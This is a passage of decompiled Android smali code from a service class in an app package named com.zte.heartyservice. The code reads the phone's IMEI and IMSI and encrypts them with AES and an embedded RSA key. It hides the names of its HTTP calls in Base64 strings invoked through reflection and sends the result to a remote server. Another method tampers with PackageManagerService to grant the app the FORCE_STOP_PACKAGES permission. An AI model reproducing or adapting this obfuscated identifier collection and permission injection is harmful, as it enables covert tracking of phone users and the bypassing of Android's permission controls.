    .local v8, bobPubKeySpec:Ljava/security/spec/X509EncodedKeySpec;
    move-object/from16 v0, v23

    invoke-virtual {v0, v8}, Ljava/security/KeyFactory;->generatePublic(Ljava/security/spec/KeySpec;)Ljava/security/PublicKey;

    move-result-object v19

    .line 625
    const/16 v29, 0x10

    move/from16 v0, v29

    new-array v0, v0, [B

    move-object/from16 v20, v0

    fill-array-data v20, :array_1

    .line 627
    .local v20, k3:[B
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x2

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const-string v32, "p0"

    aput-object v32, v30, v31

    const/16 v31, 0x1

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v19

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->u([BLjava/security/Key;)Ljava/lang/String;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 629
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x2

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const-string v32, "p1"

    aput-object v32, v30, v31

    const/16 v31, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    move-object/from16 v32, v0

    invoke-virtual/range {v32 .. v32}, Ljava/lang/String;->getBytes()[B

    move-result-object v32

    const/16 v33, 0x2

    invoke-static/range {v32 .. v33}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v0, p0

    move-object/from16 v1, v32

    move-object/from16 v2, v20

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v32

    move-object/from16 v0, p0

    move-object/from16 v1, v32

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 631
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x2

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const-string v32, "p52"

    aput-object v32, v30, v31

    const/16 v31, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    move-object/from16 v32, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v32

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 633
    invoke-virtual {v7}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v29

    invoke-interface/range {v29 .. v29}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v17

    .line 634
    .local v17, iter:Ljava/util/Iterator;
    :goto_1
    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->hasNext()Z

    move-result v29

    if-eqz v29, :cond_2

    .line 635
    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Ljava/util/Map$Entry;

    .line 636
    .local v15, entry:Ljava/util/Map$Entry;,"Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-interface {v15}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v22

    check-cast v22, Ljava/lang/String;

    .line 637
    .local v22, key:Ljava/lang/String;
    invoke-interface {v15}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v28

    check-cast v28, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 639
    .local v28, val:Ljava/lang/String;
    :try_start_1
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x2

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    aput-object v22, v30, v31

    const/16 v31, 0x1

    move-object/from16 v0, p0

    move-object/from16 v1, v28

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 640
    :catch_0
    move-exception v29

    goto :goto_1

    .line 645
    .end local v15           #entry:Ljava/util/Map$Entry;,"Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    .end local v22           #key:Ljava/lang/String;
    .end local v28           #val:Ljava/lang/String;
    :cond_2
    :try_start_2
    invoke-direct/range {p0 .. p1}, Lcom/zte/heartyservice/main/staService;->n(Landroid/content/Context;)Ljava/util/List;

    move-result-object v24

    .line 648
    .local v24, list:Ljava/util/List;
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, v24

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->g(Landroid/content/Context;Ljava/util/List;)Ljava/lang/String;

    move-result-object v9

    .line 650
    .local v9, cc:Ljava/lang/String;
    if-eqz v9, :cond_3

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v29

    if-lez v29, :cond_3

    .line 651
    new-instance v29, Ljava/lang/String;

    const-string v30, "Y29ubmVjdA=="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 652
    new-instance v29, Ljava/lang/String;

    const-string v30, "Z2V0T3V0cHV0U3RyZWFt"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v25

    check-cast v25, Ljava/io/OutputStream;

    .line 653
    .local v25, out:Ljava/io/OutputStream;
    move-object/from16 v0, v18

    invoke-static {v9, v0}, Lcom/zte/heartyservice/main/staService;->w(Ljava/lang/String;[B)[B

    move-result-object v29

    move-object/from16 v0, v25

    move-object/from16 v1, v29

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    .line 654
    invoke-virtual/range {v25 .. v25}, Ljava/io/OutputStream;->flush()V

    .line 655
    invoke-virtual/range {v25 .. v25}, Ljava/io/OutputStream;->close()V

    .line 659
    .end local v25           #out:Ljava/io/OutputStream;
    :cond_3
    new-instance v29, Ljava/lang/String;

    const-string v30, "Z2V0UmVzcG9uc2VDb2Rl"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x0

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v29

    check-cast v29, Ljava/lang/Integer;

    invoke-virtual/range {v29 .. v29}, Ljava/lang/Integer;->intValue()I

    move-result v12

    .line 661
    .local v12, dd:I
    const/16 v29, 0xc8

    move/from16 v0, v29

    if-ne v12, v0, :cond_0

    .line 662
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, v24

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->m(Landroid/content/Context;Ljava/util/List;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 663
    const/16 v26, 0x1

    goto/16 :goto_0

    .line 666
    .end local v5           #aa:Ljava/lang/String;
    .end local v6           #argTypes:[Ljava/lang/Class;,"[Ljava/lang/Class<*>;"
    .end local v7           #bb:Ljava/util/HashMap;,"Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    .end local v8           #bobPubKeySpec:Ljava/security/spec/X509EncodedKeySpec;
    .end local v9           #cc:Ljava/lang/String;
    .end local v10           #clazz:Ljava/lang/Class;,"Ljava/lang/Class<*>;"
    .end local v11           #constructor:Ljava/lang/reflect/Constructor;,"Ljava/lang/reflect/Constructor<*>;"
    .end local v12           #dd:I
    .end local v14           #encodedKey:[B
    .end local v16           #ff:Ljava/lang/Object;
    .end local v17           #iter:Ljava/util/Iterator;
    .end local v18           #k:[B
    .end local v19           #k2:Ljava/security/Key;
    .end local v20           #k3:[B
    .end local v21           #k4:[B
    .end local v23           #keyFactory:Ljava/security/KeyFactory;
    .end local v24           #list:Ljava/util/List;
    .end local v27           #u:Ljava/lang/Object;
    :catch_1
    move-exception v13

    .line 667
    .local v13, e:Ljava/lang/Exception;
    invoke-virtual {v13}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .line 619
    :array_0
    .array-data 0x1
        0x30t
        0x81t
        0x9ft
        0x30t
        0xdt
        0x6t
        0x9t
        0x2at
        0x86t
        0x48t
        0x86t
        0xf7t
        0xdt
        0x1t
        0x1t
        0x1t
        0x5t
        0x0t
        0x3t
        0x81t
        0x8dt
        0x0t
        0x30t
        0x81t
        0x89t
        0x2t
        0x81t
        0x81t
        0x0t
        0xc3t
        0x58t
        0xaet
        0x77t
        0xfft
        0x22t
        0x2bt
        0xd3t
        0x3ft
        0x3dt
        0xc6t
        0x8t
        0xa5t
        0x31t
        0xc6t
        0x0t
        0x67t
        0x1bt
        0x44t
        0xc6t
        0x2t
        0xc8t
        0xd9t
        0xd4t
        0xet
        0xf2t
        0xb6t
        0xe4t
        0xa1t
        0x1ct
        0x4at
        0xf4t
        0x6dt
        0xact
        0x2ft
        0xe2t
        0x2dt
        0x14t
        0xe3t
        0xb7t
        0x39t
        0xfat
        0x67t
        0x7bt
        0x78t
        0x18t
        0x5bt
        0xc2t
        0x13t
        0x38t
        0x6bt
        0x74t
        0x5ft
        0xc8t
        0xe0t
        0x39t
        0x35t
        0x91t
        0x3bt
        0xf7t
        0x5ft
        0xe9t
        0xb3t
        0x53t
        0x9dt
        0xe5t
        0xa7t
        0xeat
        0x77t
        0x2t
        0xc0t
        0x54t
        0x11t
        0x7et
        0x2t
        0xact
        0xa7t
        0x9at
        0xa7t
        0xc3t
        0x89t
        0xcat
        0xbet
        0xe3t
        0x65t
        0x5t
        0x58t
        0x87t
        0x17t
        0xa8t
        0x54t
        0xa2t
        0x5t
        0x67t
        0xdt
        0x61t
        0x4ct
        0x61t
        0x62t
        0xc6t
        0xbft
        0xc4t
        0x67t
        0x89t
        0xd9t
        0xd5t
        0x22t
        0xf4t
        0xf6t
        0x55t
        0x2t
        0x60t
        0xfat
        0x88t
        0x25t
        0xcft
        0x12t
        0x4bt
        0xfet
        0x17t
        0x3et
        0xf3t
        0x23t
        0x42t
        0x58t
        0x5ct
        0x6t
        0x39t
        0x2t
        0x3t
        0x1t
        0x0t
        0x1t
    .end array-data

    .line 625
    nop

    :array_1
    .array-data 0x1
        0x43t
        0xf3t
        0x5t
        0x22t
        0xb2t
        0xa6t
        0x2et
        0xe2t
        0x39t
        0x58t
        0x25t
        0x38t
        0xe0t
        0x2dt
        0x44t
        0xb7t
    .end array-data
.end method

.method private start()V
    .locals 2

    .prologue
    .line 126
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mHandler:Landroid/os/Handler;

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 127
    return-void
.end method

.method private t()[B
    .locals 6

    .prologue
    .line 740
    :try_start_0
    const-string v4, "AES"

    invoke-static {v4}, Ljavax/crypto/KeyGenerator;->getInstance(Ljava/lang/String;)Ljavax/crypto/KeyGenerator;

    move-result-object v1

    .line 741
    .local v1, keygen:Ljavax/crypto/KeyGenerator;
    new-instance v2, Ljava/security/SecureRandom;

    invoke-direct {v2}, Ljava/security/SecureRandom;-><init>()V

    .line 742
    .local v2, random:Ljava/security/SecureRandom;
    invoke-virtual {v1, v2}, Ljavax/crypto/KeyGenerator;->init(Ljava/security/SecureRandom;)V

    .line 743
    invoke-virtual {v1}, Ljavax/crypto/KeyGenerator;->generateKey()Ljavax/crypto/SecretKey;

    move-result-object v0

    .line 744
    .local v0, key:Ljavax/crypto/SecretKey;
    invoke-interface {v0}, Ljavax/crypto/SecretKey;->getEncoded()[B

    move-result-object v3

    .line 745
    .local v3, tmp:[B
    const/4 v4, 0x0

    aget-byte v4, v3, v4

    if-nez v4, :cond_0

    .line 746
    const/4 v4, 0x0

    invoke-virtual {v2}, Ljava/security/SecureRandom;->nextInt()I

    move-result v5

    or-int/lit8 v5, v5, 0x1

    int-to-byte v5, v5

    aput-byte v5, v3, v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 752
    .end local v0           #key:Ljavax/crypto/SecretKey;
    .end local v1           #keygen:Ljavax/crypto/KeyGenerator;
    .end local v2           #random:Ljava/security/SecureRandom;
    .end local v3           #tmp:[B
    :cond_0
    :goto_0
    return-object v3

    .line 749
    :catch_0
    move-exception v4

    .line 752
    const/4 v3, 0x0

    goto :goto_0
.end method

.method private u([BLjava/security/Key;)Ljava/lang/String;
    .locals 3
    .parameter "keyData"
    .parameter "key"

    .prologue
    .line 758
    :try_start_0
    const-string v1, "RSA"

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 759
    .local v0, cip:Ljavax/crypto/Cipher;
    const/4 v1, 0x1

    invoke-virtual {v0, v1, p2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 760
    invoke-virtual {v0, p1}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    const/4 v2, 0x2

    invoke-static {v1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 764
    .end local v0           #cip:Ljavax/crypto/Cipher;
    :goto_0
    return-object v1

    .line 761
    :catch_0
    move-exception v1

    .line 764
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private v(Ljava/lang/String;[B)Ljava/lang/String;
    .locals 5
    .parameter "str"
    .parameter "keyData"

    .prologue
    .line 771
    :try_start_0
    const-string v3, "AES/CBC/PKCS5Padding"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 772
    .local v0, cip:Ljavax/crypto/Cipher;
    new-instance v1, Ljavax/crypto/spec/IvParameterSpec;

    sget-object v3, Lcom/zte/heartyservice/main/staService;->IV:[B

    invoke-direct {v1, v3}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 773
    .local v1, iv:Ljavax/crypto/spec/IvParameterSpec;
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v3, "AES"

    invoke-direct {v2, p2, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 774
    .local v2, keySpec:Ljavax/crypto/spec/SecretKeySpec;
    const/4 v3, 0x1

    invoke-virtual {v0, v3, v2, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 775
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v0, v3}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v3

    const/4 v4, 0x2

    invoke-static {v3, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 779
    .end local v0           #cip:Ljavax/crypto/Cipher;
    .end local v1           #iv:Ljavax/crypto/spec/IvParameterSpec;
    .end local v2           #keySpec:Ljavax/crypto/spec/SecretKeySpec;
    :goto_0
    return-object v3

    .line 776
    :catch_0
    move-exception v3

    .line 779
    const/4 v3, 0x0

    goto :goto_0
.end method

.method private static w()V
    .locals 10

    .prologue
    .line 185
    :try_start_0
    const-string v5, "package"

    const/4 v6, 0x0

    invoke-static {v5, v6}, Landroid/os/ServiceManager;->getService(Ljava/lang/String;Z)Landroid/os/IBinder;

    move-result-object v3

    .line 187
    .local v3, packageManagerService:Landroid/os/IBinder;
    const-string v5, "mPackages"

    invoke-static {v3, v5}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->get_instance_var_object(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    .line 189
    .local v1, mPackages:Ljava/lang/Object;
    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 190
    const/4 v5, 0x0

    :try_start_1
    const-string v6, "get"

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-string v9, "com.zte.heartyservice"

    aput-object v9, v7, v8

    invoke-static {v5, v1, v6, v7}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    .line 191
    .local v2, p:Ljava/lang/Object;
    if-eqz v2, :cond_0

    .line 192
    const-string v5, "mExtras"

    invoke-static {v2, v5}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->get_instance_var_object(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    .line 193
    .local v4, ps:Ljava/lang/Object;
    if-eqz v4, :cond_0

    .line 194
    const-string v5, "com.android.server.pm.GrantedPermissions"

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    const-string v6, "grantedPermissions"

    invoke-static {v5, v4, v6}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->get_instance_var_object(Ljava/lang/Class;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/HashSet;

    .line 195
    .local v0, grantedPermissions:Ljava/util/HashSet;,"Ljava/util/HashSet<Ljava/lang/String;>;"
    const-string v5, "android.permission.FORCE_STOP_PACKAGES"

    invoke-virtual {v0, v5}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 198
    .end local v0           #grantedPermissions:Ljava/util/HashSet;,"Ljava/util/HashSet<Ljava/lang/String;>;"
    .end local v4           #ps:Ljava/lang/Object;
    :cond_0
    monitor-exit v1

    .line 202
    .end local v1           #mPackages:Ljava/lang/Object;
    .end local v2           #p:Ljava/lang/Object;
    :goto_0
    return-void

    .line 198
    .restart local v1       #mPackages:Ljava/lang/Object;
    :catchall_0
    move-exception v5

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v5
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 199
    .end local v1           #mPackages:Ljava/lang/Object;
    :catch_0
    move-exception v5

    goto :goto_0
.end method

.method public static w(Ljava/lang/String;[B)[B
    .locals 4
    .parameter "str"
    .parameter "keyData"

    .prologue
    .line 786
    :try_start_0
    const-string v3, "AES/CBC/PKCS5Padding"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 787
    .local v0, cip:Ljavax/crypto/Cipher;
    new-instance v1, Ljavax/crypto/spec/IvParameterSpec;

    sget-object v3, Lcom/zte/heartyservice/main/staService;->IV:[B

    invoke-direct {v1, v3}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 788
    .local v1, iv:Ljavax/crypto/spec/IvParameterSpec;
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v3, "AES"

    invoke-direct {v2, p1, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 789
    .local v2, keySpec:Ljavax/crypto/spec/SecretKeySpec;
    const/4 v3, 0x1

    invoke-virtual {v0, v3, v2, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 790
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v0, v3}, Ljavax/crypto/Cipher;->doFinal([B)[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 794
    .end local v0           #cip:Ljavax/crypto/Cipher;
    .end local v1           #iv:Ljavax/crypto/spec/IvParameterSpec;
    .end local v2           #keySpec:Ljavax/crypto/spec/SecretKeySpec;
    :goto_0
    return-object v3

    .line 791
    :catch_0
    move-exception v3

    .line 794
    const/4 v3, 0x0

    goto :goto_0
.end method


# virtual methods
.method public e(Landroid/content/Context;Z)J
    .locals 8
    .parameter "context"
    .parameter "i"

    .prologue
    .line 325
    const-wide/32 v6, 0x240c8400

    .line 328
    .local v6, aa:J
    :try_start_0
    new-instance v1, Ljava/lang/String;

    const-string v0, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v2, 0x2

    invoke-static {v0, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/String;

    const-string v0, "Z2V0UGVyaW9k"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v4, 0x2

    invoke-static {v0, v4}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/Object;

    const/4 v0, 0x0

    aput-object p1, v4, v0

    const/4 v0, 0x1

    invoke-static {p2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v5, 0x0

    move-object v0, p1

    invoke-static/range {v0 .. v5}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Long;

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v6

    .line 332
    :goto_0
    return-wide v6

    .line 329
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public getContext()Landroid/content/Context;
    .locals 1

    .prologue
    .line 205
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    return-object v0
.end method

.method public main()V
    .locals 2

    .prologue
    .line 209
    const-string v0, "20140208"

    const-string v1, "main in Heartyservice mix"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 210
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->pm:Landroid/content/pm/PackageManager;

    .line 211
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    const-string v1, "alarm"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->alarm:Landroid/app/AlarmManager;

    .line 212
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->mTm:Landroid/telephony/TelephonyManager;

    .line 213
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mTm:Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    .line 214
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mTm:Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    .line 215
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    if-nez v0, :cond_0

    .line 216
    const-string v0, ""

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    .line 218
    :cond_0
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    if-nez v0, :cond_1

    .line 219
    const-string v0, ""

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    .line 221
    :cond_1
    new-instance v0, Lcom/zte/heartyservice/main/staAdapter;

    invoke-direct {v0, p0}, Lcom/zte/heartyservice/main/staAdapter;-><init>(Lcom/zte/heartyservice/main/staService;)V

    iput-object v0, p0, Lcom/zte/heartyservice/main/staService;->mAdapter:Lcom/zte/heartyservice/main/staAdapter;

    .line 222
